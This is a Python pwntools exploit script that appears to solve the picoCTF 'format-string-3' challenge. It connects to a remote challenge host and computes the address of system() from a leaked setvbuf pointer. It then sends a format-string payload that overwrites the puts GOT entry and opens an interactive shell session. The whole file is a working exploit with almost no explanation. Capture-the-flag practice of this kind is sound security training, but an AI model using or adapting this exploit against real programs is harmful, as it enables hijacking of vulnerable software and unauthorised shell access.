from pwn import *

# Initializing pwtools
check_security = ELF('./format-string-3')
context.binary = './format-string-3'

# Define Host and Port
HOST = 'rhea.picoctf.net'
PORT = 60769

# Switching between local and remote environment
DEBUG = False
if DEBUG:
	s = process('./format-string-3')
else:
	s = remote(HOST, PORT)

# Response after the connection
res = s.recvline().decode()
print(res)

# Second output from printf()
res = s.recvline().decode()
print(res)

# Input for entering offset value.
offset = 38
print("Offset is:", offset)

# Extracting address of setvbuf from program output
setvbuf_addr = int(res[len(res)-13:], 16)

# From setvbuf to system
from_setvbuf_to_system = 175248

# Since PIE is disabled, the GOT entry address will always be the same 
puts_got = int('404018', 16)

# Calculating address system
system_addr = setvbuf_addr - from_setvbuf_to_system

# Compiling the addresses into a dictionary
addr_val = {puts_got : system_addr}

# Printing the hex addresses for reference only
print("GOT address for puts() is:", hex(puts_got))
print("Address for system() is:", hex(system_addr))

# Constructing payload
payload = fmtstr_payload(offset, addr_val, write_size="byte")
print("Payload lenght:", len(payload))

# Sending payload for exploit
s.sendline(payload)
s.interactive()
